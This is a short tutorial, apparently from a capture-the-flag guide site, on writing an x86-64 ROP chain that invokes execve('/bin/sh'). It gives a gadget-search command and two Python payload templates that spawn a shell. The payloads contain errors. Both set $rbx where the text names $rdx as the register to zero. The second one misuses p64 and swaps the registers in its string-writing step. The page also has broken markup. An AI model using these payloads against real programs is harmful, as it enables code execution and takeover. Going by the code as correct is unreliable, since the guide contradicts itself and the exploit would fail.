This guide shows you how to perform a Return Oriented Programming (ROP) attack.

## Identify available gadgets
Check for gadgets with this command:
```shell
ROPgadget --binary ./<program> | grep "<register>"
```

- If there are no easy-to-use `$rax` or `syscall` gadget, ROP attacks may not be the correct type of attack.
- If there are no easy-to-use `$rdi`, `$rsi` and `$rdx` gadgets, visit the following guides for more advanced ROP attacks:

          description="Guide to perform a Sigreturn ROP (SROP) attack"/>


## Locating `/bin/sh`

Refer to the associated guide to find or add a `/bin/sh` string to the program.

<LinkCard title="How to add BINSH for ROP attacks" href="/pwn/guides/binsh/"
          description="Guide to find or add a `/bin/sh` string to a program during execution"/>

## Find offset to return address

Find the offset from your buffer to the return address.

## Build payload
You will need to do the following in your payload in no particular order:
- Set `$rax` to `59`/`0x3b`
- Set `$rdi` to the address of a `/bin/sh` string
- Set `$rsi` to `0`/`0x0`
- Set `$rbx` to `0`/`0x0`

Finally, call a `syscall` gadget. Here is an example payload:
```python
payload = b"A"*64
payload += p64(rop.rax.address)
payload += p64(0x3b)
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(rop.rsi.address)
payload += p64(0x0)
payload += p64(rop.rbx.address)
payload += p64(0x0)
payload += p64(rop.syscall.address)
```

Here ie an example payload that includes adding the `/bin/sh` string:
```python
payload = b"A"*64
payload += p64(rop.rax.address)
payload += p64(b"/bin/sh\x00")
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(MOV_GADGET) # mov qword ptr [rax], rdi; ret

payload += p64(rop.rax.address)
payload += p64(0x3b)
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(rop.rsi.address)
payload += p64(0x0)
payload += p64(rop.rbx.address)
payload += p64(0x0)
payload += p64(rop.syscall.address)
```
